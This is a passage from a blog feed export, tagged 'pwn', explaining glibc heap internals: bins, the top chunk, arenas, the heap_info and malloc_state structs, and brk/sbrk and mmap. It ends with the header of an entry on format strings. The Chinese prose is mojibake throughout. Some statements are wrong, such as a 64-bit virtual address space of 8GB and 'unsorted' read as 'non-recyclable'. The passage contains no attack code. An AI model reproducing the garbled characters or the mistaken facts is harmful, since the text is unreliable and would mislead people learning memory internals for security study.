è¿›è¡Œç»„ç»‡</p></li><li><p>æ¯ä¸ª bin é‡‡å– LIFO ç­–ç•¥ï¼Œä¹Ÿå°±æ˜¯<strong>åè¿›å…ˆå‡º</strong>çš„æ–¹å¼ï¼Œæœ€è¿‘é‡Šæ”¾çš„ chunk ä¼šæ›´æ—©åœ°è¢«åˆ†é…ã€‚</p></li></ul><h5 id="Small-bins"><a href="#Small-bins" class="headerlink" title="Small bins"></a>Small bins</h5><p>small bins å°±æ˜¯ small chunkï¼Œå½“ä¸­æ¯ä¸ª chunk çš„å¤§å°ä¸å…¶æ‰€åœ¨çš„ bin çš„ index çš„å…³ç³»ä¸ºï¼š<code>chunk_size = 2 * SIZE_SZ *index</code>ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><table><thead><tr><th>ä¸‹æ ‡</th><th>2</th><th>3</th><th>4</th><th>5</th><th>x</th><th>63</th></tr></thead><tbody><tr><td>SIZE_SZ&#x3D;4ï¼ˆ32 ä½ï¼‰</td><td>16</td><td>24</td><td>32</td><td>40</td><td>2*4*x</td><td>504</td></tr><tr><td>SIZE_SZ&#x3D;8ï¼ˆ64 ä½ï¼‰</td><td>32</td><td>48</td><td>64</td><td>80</td><td>2*8*x</td><td>1008</td></tr></tbody></table><p>small bins çš„ç‰¹ç‚¹ï¼š</p><ul><li>é‡‡ç”¨<strong>åŒå‘é“¾è¡¨</strong>å¯¹ bin è¿›è¡Œç®¡ç†ã€‚æ¯ä¸ªé“¾è¡¨éƒ½æœ‰é“¾è¡¨å¤´ç»“ç‚¹ï¼Œä¸”æ¯ä¸ªé“¾è¡¨ä¸­å­˜å‚¨çš„ chunk å¤§å°éƒ½ä¸€è‡´ã€‚</li><li>æ¯ä¸ª bin å¯¹åº”çš„é“¾è¡¨é‡‡ç”¨ FIFO çš„è§„åˆ™ï¼Œä¹Ÿå°±æ˜¯<strong>å…ˆè¿›å…ˆå‡º</strong>ï¼Œæ‰€ä»¥åŒä¸€ä¸ªé“¾è¡¨ä¸­å…ˆè¢«é‡Šæ”¾çš„ chunk ä¼šå…ˆè¢«åˆ†é…å‡ºå»ã€‚</li></ul><h5 id="Large-bins"><a href="#Large-bins" class="headerlink" title="Large bins"></a>Large bins</h5><p>large bins æ˜¯ç”¨äºç®¡ç†è¾ƒå¤§å†…å­˜å—çš„æ•°æ®ç»“æ„ã€‚</p><p>å’Œsmall binsç›¸åŒï¼Œlarge binsé‡‡ç”¨<strong>åŒå‘é“¾è¡¨</strong>è¿›è¡Œç®¡ç†ï¼ŒåŒæ—¶é‡‡ç”¨é‡‡ç”¨ FIFO çš„è§„åˆ™ã€‚</p><h5 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h5><p>unsorted bin æ˜¯ç”¨äºç®¡ç†æœªåˆ†ç±»çš„ç©ºé—²å†…å­˜å—çš„æ•°æ®ç»“æ„ã€‚å½“ä¸€ä¸ªå†…å­˜å—è¢«é‡Šæ”¾æ—¶ï¼Œå †å†…å­˜ç®¡ç†å™¨ä¼šå°†å…¶æ·»åŠ åˆ° unsorted bin ä¸­ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆå¹¶åˆ°å…¶ä»–ç‰¹å®šå¤§å°èŒƒå›´çš„ bin ä¸­ã€‚</p><p>unsorted çš„å­—é¢æ„æ€å°±æ˜¯â€ ä¸å¯å›æ”¶â€ çš„æ„æ€ï¼Œå¯ä»¥çœ‹ä½œå°†ä¸å¯å›æ”¶çš„åƒåœ¾ï¼ˆä¸æ»¡è¶³èƒ½å¤Ÿè¿›è¡Œå†…å­˜åˆ†é…çš„å †å—ï¼‰éƒ½æ”¾åˆ°è¿™ä¸ªâ€ åƒåœ¾æ¡¶â€ ä¸­ã€‚</p><h3 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h3><p>ç¨‹åºç¬¬ä¸€æ¬¡è¿›è¡Œ malloc çš„æ—¶å€™ï¼Œheap ä¼šè¢«åˆ†ä¸ºä¸¤å—ï¼Œä¸€å—ç»™ç”¨æˆ·ï¼Œå‰©ä¸‹çš„é‚£å—å°±æ˜¯ top chunkã€‚</p><p>å…¶å®ï¼Œæ‰€è°“çš„ top chunk å°±æ˜¯å¤„äºå½“å‰å †çš„ç‰©ç†åœ°å€æœ€é«˜çš„ chunk ã€‚è¿™ä¸ª chunk ä¸å±äºä»»ä½•ä¸€ä¸ª binï¼Œå®ƒçš„ä½œç”¨åœ¨äºå½“æ‰€æœ‰çš„ bin éƒ½æ— æ³•æ»¡è¶³ç”¨æˆ·è¯·æ±‚çš„å¤§å°æ—¶ï¼Œå¦‚æœå…¶å¤§å°ä¸å°äºæŒ‡å®šçš„å¤§å°ï¼Œå°±è¿›è¡Œåˆ†é…ï¼Œå¹¶å°†å‰©ä¸‹çš„éƒ¨åˆ†ä½œä¸ºæ–°çš„ top chunkã€‚å¦åˆ™ï¼Œå°±å¯¹ heap è¿›è¡Œæ‰©å±•åå†è¿›è¡Œåˆ†é…ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œtop chunk çš„ <em>prev_inuse</em> æ¯”ç‰¹ä½å§‹ç»ˆä¸º 1ï¼Œå¦åˆ™å…¶å‰é¢çš„ chunk å°±ä¼šè¢«åˆå¹¶åˆ° top chunk ä¸­ã€‚</p><h3 id="Last-remainder"><a href="#Last-remainder" class="headerlink" title="Last remainder"></a>Last remainder</h3><p>åœ¨ç”¨æˆ·ä½¿ç”¨ malloc è¯·æ±‚åˆ†é…å†…å­˜æ—¶ï¼Œptmalloc2 æ‰¾åˆ°çš„ chunk å¯èƒ½å¹¶ä¸å’Œç”³è¯·çš„å†…å­˜å¤§å°ä¸€è‡´ï¼Œè¿™æ—¶å€™å°±å°†åˆ†å‰²ä¹‹åçš„å‰©ä½™éƒ¨åˆ†ç§°ä¹‹ä¸º last remainder chunk ï¼Œç”± unsorted bin è¿›è¡Œå­˜å‚¨ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ top chunk åˆ†å‰²å‰©ä¸‹çš„éƒ¨åˆ†ä¸ä¼šä½œä¸º last remainderã€‚</p><h2 id="å®è§‚ç»“æ„"><a href="#å®è§‚ç»“æ„" class="headerlink" title="å®è§‚ç»“æ„"></a>å®è§‚ç»“æ„</h2><h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><p>arena æ˜¯æŒ‡ä¸€å—ç”¨äºç®¡ç†å’Œåˆ†é…å†…å­˜çš„åŒºåŸŸï¼Œæ˜¯å†…å­˜æ± çš„ä¸€ç§ã€‚å®ƒæ˜¯å †å†…å­˜ç®¡ç†çš„ä¸€ç§ç»„ç»‡æ–¹å¼ï¼Œæ¯ä¸ª arena éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å†…å­˜åŒºåŸŸï¼Œç”¨äºç®¡ç†ç‰¹å®šèŒƒå›´å†…çš„å†…å­˜å—ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œglibc ä¸ºæ¯ä¸ªçº¿ç¨‹åˆ†é…ä¸€ä¸ª arenaï¼Œä»¥å‡å°‘ä¸åŒçº¿ç¨‹ä¹‹é—´çš„ç«äº‰å’Œé”å†²çªã€‚</p><blockquote><p>main_arena å¹¶ä¸åœ¨ç”³è¯·çš„ heap ä¸­ï¼Œè€Œæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œåœ¨ libc.so çš„æ•°æ®æ®µã€‚</p></blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªçº¿ç¨‹éƒ½æœ‰å¯¹åº”çš„ arenaï¼ˆä½¿ç”¨äº†ç³»ç»Ÿçº§çš„å†…å­˜åˆ†é…æ–¹å¼å¦‚ mmap() ç­‰ï¼Œçº¿ç¨‹å¯èƒ½ä¼šç»•è¿‡ glibc çš„å†…å­˜åˆ†é…æœºåˆ¶ï¼Œå› æ­¤æ²¡æœ‰ä¸ glibc ç›¸å…³è”çš„ arenaï¼›é™¤æ­¤ä¹‹å¤–ä¹Ÿå¯ä»¥æ‰‹åŠ¨è®¾ç½®é™åˆ¶çº¿ç¨‹çš„ arena åˆ›å»ºæ•°é‡ï¼‰ã€‚</p><h5 id="åˆ†é…è§„åˆ™"><a href="#åˆ†é…è§„åˆ™" class="headerlink" title="åˆ†é…è§„åˆ™"></a>åˆ†é…è§„åˆ™</h5><ul><li><p><code>arena</code>: æœ‰ä¸€ä¸ª main_arena ï¼Œæ˜¯ç”±ä¸»çº¿ç¨‹åˆ›å»ºçš„ï¼Œthread_arena åˆ™ä¸ºå„çº¿ç¨‹åˆ›å»ºçš„ï¼Œå½“ arena æ»¡äº†ä¹‹åå°±ä¸å†åˆ›å»ºè€Œæ˜¯ä¸å…¶ä»– arena å…±äº«ä¸€ä¸ª arenaï¼Œæ–¹æ³•ä¸ºä¾æ¬¡ç»™å„ä¸ª arena ä¸Šé”ï¼ˆæŸ¥çœ‹æ˜¯å¦æœ‰å…¶ä»–çº¿ç¨‹æ­£åœ¨ä½¿ç”¨è¯¥arenaï¼‰ï¼Œå¦‚æœä¸Šé”æˆåŠŸï¼ˆæ²¡æœ‰å…¶ä»–çº¿ç¨‹æ­£åœ¨ä½¿ç”¨ï¼‰ï¼Œåˆ™ä½¿ç”¨è¯¥ arena ï¼Œä¹‹åä¸€ç›´ä½¿ç”¨è¿™ä¸ª arena ï¼Œå¦‚æœæ— æ³•ä½¿ç”¨åˆ™é˜»å¡ç­‰å¾…ã€‚</p></li><li><p><code>heap</code>ï¼šç­‰çº§æ¯”arenaè¦ä½ä¸€äº›ï¼Œä¸€ä¸ª arena å¯ä»¥æœ‰å¤šä¸ª heapï¼Œä¹Ÿæ˜¯å­˜å‚¨äº†å †ç›¸å…³çš„ä¿¡æ¯ã€‚</p></li><li><p><code>chunk</code>ï¼šåˆ†é…ç»™ç”¨æˆ·çš„å†…å­˜çš„ä¸€ä¸ªå•ä½ï¼Œæ¯å½“æˆ‘ä»¬åˆ†é…ä¸€æ®µå†…å­˜çš„æ—¶å€™å…¶å®å°±æ˜¯åˆ†é…å¾—åˆ°äº†ä¸€ä¸ª chunk ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ chunk å½“ä¸­è¿›è¡Œä¸€å®šçš„æ“ä½œäº†ã€‚ä¸è¿‡ä¸ºäº†è¿›è¡ŒåŠ¨æ€åˆ†é…ï¼Œchunk æœ¬èº«ä¹Ÿæœ‰ä¸€äº›æ•°æ®ï¼ˆå…ƒæ•°æ®ï¼‰ï¼Œæ˜¯ç”¨æ¥æŒ‡ç¤ºå…¶åˆ†é…ç­‰ç­‰çš„æ•°æ®ã€‚</p></li></ul><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>å½“ç¨‹åºåˆšåˆšå¼€å§‹è¿è¡Œæ—¶ï¼Œæ¯ä¸€ä¸ªçº¿ç¨‹æ˜¯æ²¡æœ‰è‡ªå·±çš„ heap åŒºåŸŸçš„ï¼Œéœ€è¦ç¨‹åºä¸»åŠ¨ç”³è¯·å†…å­˜ã€‚å½“ç¨‹åºä½¿ç”¨å®Œäº†è¿™ä¸ª  heap çš„èµ„æºï¼Œå°±å¿…é¡»è¦å†æ¬¡ç”³è¯·ï¼Œå¹¶ä¸”ä¸€èˆ¬æƒ…å†µä¸‹ç”³è¯·çš„ heap æ˜¯ä¸è¿ç»­çš„ã€‚æˆ‘ä»¬å°±éœ€è¦ heap_infoè¿™ä¸ªæ•°æ®ç»“æ„æ¥è®°å½•ä¸åŒ heap ä¹‹é—´çš„é“¾æ¥å…³ç³»ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span></span><br><span class="hljs-class">&#123;</span><br>  mstate ar_ptr;                 <span class="hljs-comment">//å¯¹åº”çš„arenaçš„åœ°å€               </span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">heap_info</span> *<span class="hljs-title">prev</span>;</span>       <span class="hljs-comment">//ä¸Šä¸€ä¸ª heap_info çš„åœ°å€   </span><br>  <span class="hljs-type">size_t</span> size;                   <span class="hljs-comment">//å½“å‰å †çš„å¤§å°        </span><br>  <span class="hljs-type">size_t</span> mprotect_size;          <span class="hljs-comment">//å †å®é™…ä½¿ç”¨çš„å†…å­˜å¤§å°</span><br>  <span class="hljs-type">char</span> pad[<span class="hljs-number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; <span class="hljs-comment">//å¡«å……å­—æ®µï¼Œç”¨äºå¯¹é½ _heap_info ç»“æ„ä½“çš„å¤§å°</span><br>&#125; heap_info;<br></code></pre></td></tr></table></figure><p>ç‰¹ç‚¹ï¼š</p><ul><li>ä½¿ç”¨å•å‘é“¾è¡¨è¿›è¡Œé“¾æ¥</li><li>éœ€è¦ç¡®ä¿ <code>MALLOC_ALIGN_MASK+1</code> å¯¹é½ï¼Œæ‰€ä»¥å¯èƒ½ä¼šç”¨åˆ° <em>pad</em>ï¼Œ</li></ul><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>malloc_state ç»“æ„ç”¨äºç®¡ç†å †ï¼Œè®°å½•æ¯ä¸ª arena å½“å‰ç”³è¯·çš„å†…å­˜çš„å…·ä½“çŠ¶æ€ï¼Œæ¯”å¦‚è¯´æ˜¯å¦æœ‰ç©ºé—² chunkï¼Œæœ‰ä»€ä¹ˆå¤§å°çš„ç©ºé—² chunk ç­‰ç­‰ã€‚æ— è®ºæ˜¯ thread arena è¿˜æ˜¯ main arenaï¼Œå®ƒä»¬éƒ½åªæœ‰ä¸€ä¸ª malloc state ç»“æ„ã€‚</p><blockquote><p>ç”±äº thread çš„ arena å¯èƒ½æœ‰å¤šä¸ªï¼Œæ‰€ä»¥å®ƒçš„ malloc state ç»“æ„ä¼šåœ¨æœ€æ–°ç”³è¯·çš„ arena ä¸­ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> &#123;</span><br>    __libc_lock_define(, mutex);            <span class="hljs-comment">//ç”¨äºæ§åˆ¶ç¨‹åºä¸²è¡Œè®¿é—®åŒä¸€ä¸ªåˆ†é…åŒº,å®ç°è®¿é—®çš„äº’æ–¥é”ã€‚</span><br>    <span class="hljs-type">int</span> flags;                              <span class="hljs-comment">//æ ‡å¿—ä½ï¼Œç”¨äºè®°å½•ä¸€äº›çŠ¶æ€ä¿¡æ¯</span><br>    mfastbinptr fastbinsY[ NFASTBINS ];     <span class="hljs-comment">//fastbin çš„ç©ºé—²å—é“¾è¡¨,å­˜æ”¾æ¯ä¸ª fast chunk é“¾è¡¨å¤´éƒ¨çš„æŒ‡é’ˆ</span><br>    mchunkptr top;<span class="hljs-comment">//æœ€é¡¶éƒ¨çš„å†…å­˜å—ï¼Œç”¨äºæŒ‡ç¤ºå½“å‰å¯ç”¨çš„å†…å­˜ä½ç½®</span><br>    mchunkptr last_remainder;               <span class="hljs-comment">//æœ€è¿‘ä¸€æ¬¡åˆ†å‰²çš„å°å—å†…å­˜è¯·æ±‚å‰©ä½™éƒ¨åˆ†çš„å†…å­˜å—</span><br>    mchunkptr bins[ NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span> ];        <span class="hljs-comment">//ç”¨äºå­˜å‚¨ unstored binï¼Œsmall bins å’Œ large bins çš„ chunk é“¾è¡¨</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[ BINMAPSIZE ];      <span class="hljs-comment">//æ ‡è¯†æŸä¸€ä¸ª bin ä¸­æ˜¯å¦åŒ…å«ç©ºé—² chunk</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span>              <span class="hljs-comment">//æŒ‡å‘ä¸‹ä¸€ä¸ª arena çš„æŒ‡é’ˆï¼Œå½¢æˆäº†ä¸€ä¸ªé“¾è¡¨ç»“æ„</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span>         <span class="hljs-comment">//æŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—²çš„ arena çš„æŒ‡é’ˆï¼Œå½¢æˆäº†ä¸€ä¸ªé“¾è¡¨ç»“æ„ã€‚</span><br>    INTERNAL_SIZE_T attached_threads;       <span class="hljs-comment">//é™„åŠ åˆ°æ­¤ arena çš„çº¿ç¨‹æ•°é‡</span><br>    INTERNAL_SIZE_T system_mem;             <span class="hljs-comment">//åœ¨è¯¥ arena ä¸­ä»ç³»ç»Ÿåˆ†é…çš„å†…å­˜æ€»é‡</span><br>    INTERNAL_SIZE_T max_system_mem;         <span class="hljs-comment">//åœ¨è¯¥ arena ä¸­ä»ç³»ç»Ÿåˆ†é…çš„å†…å­˜çš„æœ€å¤§å€¼</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>è¦æ³¨æ„çš„æ˜¯ï¼Œmain arena çš„ malloc_state å¹¶ä¸æ˜¯ heap segment çš„ä¸€éƒ¨åˆ†ï¼Œè€Œæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå­˜å‚¨åœ¨ libc.so çš„æ•°æ®æ®µã€‚</strong></p><h2 id="å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨"><a href="#å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨"></a>å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨</h2><p>æˆ‘ä»¬åœ¨ç¨‹åºä»£ç ä¸­ä½¿ç”¨ malloc å‡½æ•°å’Œ free å‡½æ•°æ¥ç”³è¯·å’Œåˆ†é…å†…å­˜ã€‚ä½†å®é™…ä¸Šä¸ç³»ç»Ÿäº¤äº’çš„å¹¶ä¸æ˜¯è¿™ä¸¤ä¸ªå‡½æ•°è€Œæ˜¯</p><p><code>(s)brk</code> å‡½æ•°ä»¥åŠ <code>mmap</code> å‡½æ•°ï¼Œå®ƒä»¬ä¹‹é—´çš„å…³ç³»å¦‚ä¸‹ï¼š</p><p><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/malloc_sys.png"></p><p>å…·ä½“çš„ç»“æ„å¦‚ä¸‹å›¾ï¼ˆå’Œç½‘ä¸Šçš„é‚£äº›å›¾ä¸€æ ·ï¼Œæˆ‘é‡åšä¸€å¼ å›¾æ˜¯å› ä¸ºç½‘ä¸Šçš„éƒ½æ˜¯è‹±æ–‡ï¼Œæˆ‘çš„è‹±è¯­æ°´å¹³ä¸é«˜çœ‹ä¸æ‡‚ğŸ˜…ï¼‰ï¼š</p><blockquote><p>è¦æ³¨æ„çš„æ˜¯ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„ â€å †â€œ éƒ½åœ¨ Heap åŒºåŸŸï¼Œmmap å¯¹åº” <code>Memory Mapping Segment</code> ï¼Œbrk æ‰æ˜¯å¯¹åº” <code>Heap</code> çš„ã€‚</p><p>ä¸‹å›¾ä¸º32ä½ç¨‹åºçš„è™šæ‹Ÿå†…å­˜ç»“æ„ï¼Œ64ä½çš„è™šæ‹Ÿåœ°å€å¤§å°ä¸º8GBï¼Œä½†ç»“æ„å¤§è‡´ç›¸åŒã€‚</p></blockquote><p><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/stack_heap.png"></p><p>å¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬çš„ malloc å‡½æ•°æ˜¯åœ¨ç”¨æˆ·ç©ºé—´å¯¹åº”çš„ 0~3G çš„å†…å­˜è¿›è¡Œæ“ä½œï¼Œä½†ç”¨æˆ·ç©ºé—´çš„ä»£ç ä¸èƒ½ç›´æ¥è®¿é—®å†…æ ¸ç©ºé—´ï¼Œå› æ­¤éœ€è¦å€Ÿç”¨ sbrk() ç­‰ç³»ç»Ÿå‡½æ•°å……å½“ä¸å†…æ ¸ä¹‹é—´çš„æ¥å£ã€‚å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥åœ¨ç”¨æˆ·ç©ºé—´çš„ä»£ç ä¸­ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ï¼Œè¿›è€Œè¶Šè¿‡æ¥å£ç›´æ¥ä¸ç³»ç»Ÿå†…æ ¸äº¤äº’ï¼Œä¹Ÿèƒ½è¾¾åˆ°åŒæ ·çš„æ•ˆæœï¼ˆä½†æ˜¯ç³»ç»Ÿè°ƒç”¨çš„æ•ˆç‡ä¼šç›¸å¯¹è¾ƒä½ï¼‰ã€‚</p><p><code>brk</code> é€‚ç”¨äºå°å—å†…å­˜çš„åˆ†é…å’Œé‡Šæ”¾ï¼Œè€Œ <code>mmap</code> é€‚ç”¨äºå¤§å—å†…å­˜çš„åˆ†é…å’Œä¸€äº›ç‰¹æ®Šéœ€æ±‚ï¼ˆä¾‹å¦‚æ˜ å°„æ–‡ä»¶åˆ°å†…å­˜ï¼‰ï¼Œæ¥ä¸‹æ¥ä¼šè¿›è¡Œè¯¦ç»†çš„åˆ†æã€‚</p><p>æˆ‘ä»¬ä¸»è¦æ¥åˆ†æç”³è¯·å †å—çš„æ“ä½œ</p><h4 id="brk-ä¸-sbrk"><a href="#brk-ä¸-sbrk" class="headerlink" title="brk ä¸ sbrk"></a>brk ä¸ sbrk</h4><p>è¿™ä¸¤ä¸ªå‡½æ•°éƒ½æ˜¯é€šè¿‡æ”¹å˜ peogram break ï¼ˆç¨‹åºä¸­æ–­ç‚¹ï¼‰çš„ä½ç½®æ¥æ”¹å˜æ•°æ®æ®µé•¿åº¦ï¼Œè¿›è€Œå®ç°è™šæ‹Ÿå†…å­˜åˆ°ç‰©ç†å†…å­˜çš„æ˜ å°„ã€‚</p><h5 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h5><p> <code>brk</code> é€šè¿‡ä¿®æ”¹æ•°æ®æ®µçš„æœ«å°¾åœ°å€å®ç°å†…å­˜çš„åˆ†é…ä¸å›æ”¶ã€‚å®ƒçš„åŸå‹ä¸º  <code>void *brk(void *addr);</code> ï¼Œå…¶ä¸­å‚æ•° <em>addr</em> æ˜¯æ–°çš„ Heap æ®µç»“æŸåœ°å€ã€‚è°ƒç”¨ <code>brk</code> åï¼Œæ“ä½œç³»ç»Ÿå°† Heap æ®µçš„ç»“æŸåœ°å€è®¾ç½®ä¸º <em>addr</em>ï¼Œå¹¶å°† Heap æ®µæ‰©å±•æˆ–ç¼©å°è‡³æ–°çš„ç»“æŸåœ°å€ã€‚</p><p>åˆå§‹æ—¶ï¼Œå †æ®µçš„èµ·å§‹åœ°å€ <em>start_brk</em> ä»¥åŠç»“æŸä½ç½® <em>brk</em> æŒ‡å‘åŒä¸€ä½ç½®ï¼Œæ ¹æ®ç¨‹åºæ˜¯å¦å¼€å¯äº† ASLRä¿æŠ¤ï¼Œä½ç½®ä¼šæœ‰æ‰€ä¸åŒ ï¼š</p><ul><li>ä¸å¼€ ASLR ä¿æŠ¤æ—¶ï¼Œ <em>start_brk</em> ä»¥åŠ <em>brk</em> ä¼šæŒ‡å‘ data&#x2F;bss æ®µçš„ç»“å°¾ï¼›</li><li>å¼€å¯ ASLR ä¿æŠ¤æ—¶ï¼Œ<em>start_brk</em> ä»¥åŠ <em>brk</em> ä¼šæŒ‡å‘ data&#x2F;bss æ®µåçš„éšæœºåç§»å¤„ï¼ˆä¸¤ä¸ªæŒ‡é’ˆä»æŒ‡å‘åŒä¸€å¤„ï¼‰</li></ul><h5 id="sbrk"><a href="#sbrk" class="headerlink" title="sbrk"></a>sbrk</h5><p><code>sbrk  </code> é€šè¿‡æ§åˆ¶é—´æ–­ç‚¹å‘å‰æˆ–å‘åç§»åŠ¨æŒ‡å®šé•¿åº¦å­—èŠ‚æ¥å®ç°å†…å­˜çš„åˆ†é…ä¸å›æ”¶ã€‚å®ƒçš„åŸå‹ä¸º <code>void *sbrk(intptr_t increment);</code>ï¼Œå…¶ä¸­å‚æ•° <em>increment</em> æ˜¯éœ€è¦å¢åŠ æˆ–å‡å°çš„å­—èŠ‚æ•°ï¼Œæ ¹æ® <em>increment</em> æ•°å€¼çš„ä¸åŒï¼Œå¯¹åº”çš„å˜åŒ–ä¹Ÿä¸ç›¸åŒï¼š</p><ul><li>å½“ <em>increment</em> ä¸ºæ­£æ•°æ—¶ï¼Œpeogram break ä¼šå‘é«˜åœ°å€ç§»åŠ¨ç›¸åº”çš„å­—èŠ‚æ•°ï¼ŒåŒæ ·å †çš„å¤§å°ä¼šå¢åŠ ç›¸åº”çš„å­—èŠ‚æ•°ï¼Œç›¸å½“äºç”³è¯·å†…å­˜ï¼›</li><li>å½“ <em>increment</em> ä¸ºè´Ÿæ•°æ—¶ï¼Œpeogram break ä¼šå‘ä½åœ°å€ç§»åŠ¨ç›¸åº”çš„å­—èŠ‚æ•°ï¼ŒåŒæ ·å †çš„å¤§å°ä¼šå‡å°ç›¸åº”çš„å­—èŠ‚æ•°ï¼Œç›¸å½“äºé‡Šæ”¾å†…å­˜ï¼›</li><li>å½“ <em>increment</em> ä¸º 0 æ—¶ï¼Œpeogram break ä¸ç§»åŠ¨ä½ç½®ï¼ŒåŒæ ·å‡½æ•°åªè¿”å›å½“å‰ä½ç½®ã€‚</li></ul><h4 id="mmap-ä¸-munmap"><a href="#mmap-ä¸-munmap" class="headerlink" title="mmap ä¸ munmap"></a>mmap ä¸ munmap</h4><p><code>mmap</code> å‡½æ•°æ˜¯ä¸€ç§å†…å­˜æ˜ å°„æ–‡ä»¶çš„æ–¹æ³•ï¼Œå°†æ–‡ä»¶æˆ–è€…å…¶ä»–å¯¹è±¡æ˜ å°„åˆ°è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œå®ç°æ–‡ä»¶ç£ç›˜åœ°å€å’Œè¿›ç¨‹è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­çš„æŸä¸€æ®µè™šæ‹Ÿåœ°å€çš„ä¸€ä¸€å¯¹åº”å…³ç³»ã€‚</p><p><img src="/img/%E5%A0%86%E6%A6%82%E8%BF%B0/mmap.png"></p><p>æ˜ å°„å…³ç³»ä¸€æ—¦å»ºç«‹ï¼Œå°±å¯ä»¥ç›´æ¥å†å†…å­˜ä¸­å¯¹æ˜ å°„çš„æ–‡ä»¶è¿›è¡Œè¯»å†™ï¼Œå¯¹åº”çš„æ“ä½œä¼šç›´æ¥åæ˜ åœ¨æ˜ å°„çš„æ–‡ä»¶ä¸Šï¼Œä¸ç”¨å†å€Ÿç”¨ç³»ç»Ÿè°ƒç”¨å‡½æ•°äº†ã€‚</p><p><code>mmap</code> çš„å‡½æ•°åŸå‹æ˜¯ <code>void * mmap(void * addr, size_t length,int prot,int flags,int fd,off_t offset);</code> ï¼Œå…¶ä¸­ <em>length</em> æ˜¯æŒ‡å®šçš„æ˜ å°„é•¿åº¦ï¼Œå®ƒå¹¶æ²¡æœ‰ä¸¥æ ¼è¦æ±‚å¿…é¡»å¡«å…¥æ“ä½œç³»ç»Ÿåˆ†é¡µå¤§å°çš„æ•´æ•°å€ï¼Œä½†æ˜¯æ“ä½œç³»ç»Ÿä¼šè‡ªåŠ¨å‘ä¸Šå–æ•´ï¼Œç¡®ä¿æ˜ å°„çš„é•¿åº¦æ»¡è¶³å¯¹å…¶è¦æ±‚ã€‚</p><p><code>munmap</code> å‡½æ•°ç”¨äºè§£é™¤æ˜ å°„å…³ç³»ï¼Œå…¶å‡½æ•°åŸå‹ä¸º <code>int munmap(void * addr, size_t length);</code> ï¼Œ<em>addr</em> ä¸ºå‡½æ•°è¿”å›æ¥æ”¶çš„åœ°å€ï¼Œ<em>length</em> ä¸ºè¯·æ±‚åˆ†é…çš„é•¿åº¦ã€‚</p><hr><p>æœªå®Œå¾…ç»­ğŸ¤—</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²è¿›é˜¶ç‰ˆ</title>
    <link href="/2023/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/"/>
    <url>/2023/07/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E9%98%B6%E7%89%88/</url>
    
